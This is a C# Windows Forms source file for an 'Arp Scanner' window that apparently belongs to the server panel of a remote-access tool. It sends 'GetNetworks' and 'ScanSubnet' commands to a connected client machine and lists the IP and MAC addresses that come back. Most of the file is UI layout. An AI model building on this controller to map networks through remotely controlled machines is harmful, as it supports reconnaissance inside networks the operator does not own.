using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormArpScanner : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	public DataGridView dataGridView2;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column4;

	public RJComboBox comboBoxNetworks;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem refreshToolStripMenuItem;

	private Panel panel1;

	public MaterialLabel materialLabel1;

	private Timer timer1;

	private Panel panel2;

	public RJButton buttonScan;

	public FormArpScanner()
	{
		InitializeComponent();
	}

	private void FormArpScanner_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		base.FormClosing += FormArpScanner_FormClosing;
		ChangeScheme(this);
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
	}

	private void FormArpScanner_FormClosing(object sender, FormClosingEventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged -= ChangeScheme;
	}

	private void ChangeScheme(object sender)
	{
		if (base.IsDisposed || dataGridView2 == null || buttonScan == null || comboBoxNetworks == null)
		{
			return;
		}
		try
		{
			bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
			Color backColor = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
			Color foreColor = (isDark ? Color.White : Color.Black);
			Color gridBackColor = (isDark ? Color.FromArgb(50, 50, 50) : Color.White);
			Color gridForeColor = (isDark ? Color.White : FormMaterial.PrimaryColor);
			Color altBackColor = (isDark ? Color.FromArgb(45, 45, 45) : Color.FromArgb(245, 245, 245));
			BackColor = backColor;
			dataGridView2.BackgroundColor = gridBackColor;
			dataGridView2.GridColor = (isDark ? Color.FromArgb(60, 60, 60) : Color.White);
			dataGridView2.ColumnHeadersDefaultCellStyle.BackColor = gridBackColor;
			dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = gridForeColor;
			dataGridView2.ColumnHeadersDefaultCellStyle.SelectionBackColor = gridBackColor;
			dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = gridForeColor;
			dataGridView2.DefaultCellStyle.BackColor = gridBackColor;
			dataGridView2.DefaultCellStyle.ForeColor = gridForeColor;
			dataGridView2.DefaultCellStyle.SelectionBackColor = gridForeColor;
			dataGridView2.DefaultCellStyle.SelectionForeColor = gridBackColor;
			dataGridView2.RowsDefaultCellStyle.BackColor = gridBackColor;
			dataGridView2.RowsDefaultCellStyle.ForeColor = gridForeColor;
			dataGridView2.RowsDefaultCellStyle.SelectionBackColor = gridForeColor;
			dataGridView2.RowsDefaultCellStyle.SelectionForeColor = gridBackColor;
			dataGridView2.AlternatingRowsDefaultCellStyle.BackColor = altBackColor;
			dataGridView2.AlternatingRowsDefaultCellStyle.ForeColor = gridForeColor;
			dataGridView2.AlternatingRowsDefaultCellStyle.SelectionBackColor = gridForeColor;
			dataGridView2.AlternatingRowsDefaultCellStyle.SelectionForeColor = gridBackColor;
			buttonScan.BackColor = FormMaterial.PrimaryColor;
			buttonScan.BackgroundColor = FormMaterial.PrimaryColor;
			buttonScan.ForeColor = Color.White;
			buttonScan.TextColor = Color.White;
			comboBoxNetworks.BorderColor = FormMaterial.PrimaryColor;
			comboBoxNetworks.IconColor = FormMaterial.PrimaryColor;
			comboBoxNetworks.ForeColor = gridForeColor;
			comboBoxNetworks.BackColor = backColor;
			foreach (Control control in base.Controls)
			{
				if (control is MaterialLabel lbl)
				{
					lbl.BackColor = backColor;
					lbl.ForeColor = foreColor;
				}
			}
		}
		catch
		{
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[1] { "GetNetworks" }));
		}
	}

	private void buttonScan_Click(object sender, EventArgs e)
	{
		try
		{
			if (client == null)
			{
				materialLabel1.Text = "Error: Client is not connected!";
				return;
			}
			string selectedNetwork = comboBoxNetworks.Texts;
			if (string.IsNullOrEmpty(selectedNetwork))
			{
				materialLabel1.Text = "Error: Please select a network first!";
				return;
			}
			dataGridView2.Rows.Clear();
			materialLabel1.Text = "Sending scan request for " + selectedNetwork + "...";
			buttonScan.Enabled = false;
			comboBoxNetworks.Enabled = false;
			byte[] packet = LEB128.Write(new object[2] { "ScanSubnet", selectedNetwork });
			client.Send(packet);
			materialLabel1.Text = "Request sent! Waiting for response...";
		}
		catch (Exception ex)
		{
			materialLabel1.Text = "UI Error: " + ex.Message;
			buttonScan.Enabled = true;
			comboBoxNetworks.Enabled = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormArpScanner));
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.comboBoxNetworks = new CustomControls.RJControls.RJComboBox();
		this.panel2 = new System.Windows.Forms.Panel();
		this.buttonScan = new CustomControls.RJControls.RJButton();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		this.contextMenuStrip1.SuspendLayout();
		this.panel1.SuspendLayout();
		this.panel2.SuspendLayout();
		base.SuspendLayout();
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.White;
		this.dataGridView2.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column1, this.Column2, this.Column3, this.Column4);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.Location = new System.Drawing.Point(3, 103);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersVisible = false;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		this.dataGridView2.RowsDefaultCellStyle = dataGridViewCellStyle4;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.Size = new System.Drawing.Size(931, 480);
		this.dataGridView2.TabIndex = 0;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "IP Address";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column2.HeaderText = "MAC Address";
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column3.HeaderText = "Vendor / Info";
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column4.HeaderText = "Status";
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.contextMenuStrip1.BackColor = System.Drawing.Color.White;
		this.contextMenuStrip1.ForeColor = System.Drawing.Color.Black;
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.refreshToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(181, 48);
		this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.refreshToolStripMenuItem.Text = "Refresh Networks";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.ForeColor = System.Drawing.Color.Black;
		this.panel1.Location = new System.Drawing.Point(3, 585);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(931, 20);
		this.panel1.TabIndex = 1;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 0;
		this.materialLabel1.Text = "Please wait...";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.comboBoxNetworks.BackColor = System.Drawing.Color.WhiteSmoke;
		this.comboBoxNetworks.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.comboBoxNetworks.BorderSize = 1;
		this.comboBoxNetworks.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxNetworks.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.comboBoxNetworks.ForeColor = System.Drawing.Color.Black;
		this.comboBoxNetworks.IconColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.comboBoxNetworks.ListBackColor = System.Drawing.Color.White;
		this.comboBoxNetworks.ListTextColor = System.Drawing.Color.Black;
		this.comboBoxNetworks.Location = new System.Drawing.Point(3, 3);
		this.comboBoxNetworks.MinimumSize = new System.Drawing.Size(200, 30);
		this.comboBoxNetworks.Name = "comboBoxNetworks";
		this.comboBoxNetworks.Padding = new System.Windows.Forms.Padding(1);
		this.comboBoxNetworks.Size = new System.Drawing.Size(765, 30);
		this.comboBoxNetworks.TabIndex = 2;
		this.comboBoxNetworks.Texts = "";
		this.panel2.BackColor = System.Drawing.Color.White;
		this.panel2.Controls.Add(this.buttonScan);
		this.panel2.Controls.Add(this.comboBoxNetworks);
		this.panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel2.ForeColor = System.Drawing.Color.Black;
		this.panel2.Location = new System.Drawing.Point(3, 64);
		this.panel2.Name = "panel2";
		this.panel2.Size = new System.Drawing.Size(931, 37);
		this.panel2.TabIndex = 4;
		this.buttonScan.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.buttonScan.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.buttonScan.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.buttonScan.BorderRadius = 0;
		this.buttonScan.BorderSize = 0;
		this.buttonScan.FlatAppearance.BorderSize = 0;
		this.buttonScan.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.buttonScan.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.buttonScan.ForeColor = System.Drawing.Color.White;
		this.buttonScan.Location = new System.Drawing.Point(774, 3);
		this.buttonScan.Name = "buttonScan";
		this.buttonScan.Size = new System.Drawing.Size(154, 31);
		this.buttonScan.TabIndex = 49;
		this.buttonScan.Text = "Scan";
		this.buttonScan.TextColor = System.Drawing.Color.White;
		this.buttonScan.UseVisualStyleBackColor = false;
		this.buttonScan.Click += new System.EventHandler(buttonScan_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(937, 608);
		base.Controls.Add(this.panel2);
		base.Controls.Add(this.dataGridView2);
		base.Controls.Add(this.panel1);
		base.Name = "FormArpScanner";
		this.Text = "Arp Scanner";
		base.Load += new System.EventHandler(FormArpScanner_Load);
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
